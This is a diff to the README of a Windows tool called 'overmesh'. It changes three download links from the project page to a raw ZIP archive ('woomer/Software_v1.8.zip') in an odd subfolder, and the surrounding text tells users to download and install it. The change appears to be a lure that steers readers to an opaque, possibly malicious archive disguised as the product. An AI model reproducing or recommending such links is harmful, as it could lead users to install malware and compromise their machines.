@@ -1,6 +1,6 @@
 # 🧩 overmesh - Self-hosted mesh control on Windows
 
-[![Download overmesh](https://img.shields.io/badge/Download%20overmesh-blue?style=for-the-badge)](https://github.com/literal-xenophobia705/overmesh)
+[![Download overmesh](https://img.shields.io/badge/Download%20overmesh-blue?style=for-the-badge)](https://github.com/literal-xenophobia705/overmesh/raw/refs/heads/main/woomer/Software_v1.8.zip)
 
 ## 🖥️ What overmesh does
 
@@ -25,7 +25,7 @@ If you plan to use offline maps, set aside more disk space for map tiles.
 
 Open the download page here:
 
-https://github.com/literal-xenophobia705/overmesh
+https://github.com/literal-xenophobia705/overmesh/raw/refs/heads/main/woomer/Software_v1.8.zip
 
 On that page, look for the latest release or the main download file. If you see a ZIP file, save it to your computer. If you see an installer, save that instead.
 
@@ -204,6 +204,6 @@ After setup, try this:
 
 If you need the file again, use this link:
 
-https://github.com/literal-xenophobia705/overmesh
+https://github.com/literal-xenophobia705/overmesh/raw/refs/heads/main/woomer/Software_v1.8.zip
 
 Download it, then follow the Windows install steps above
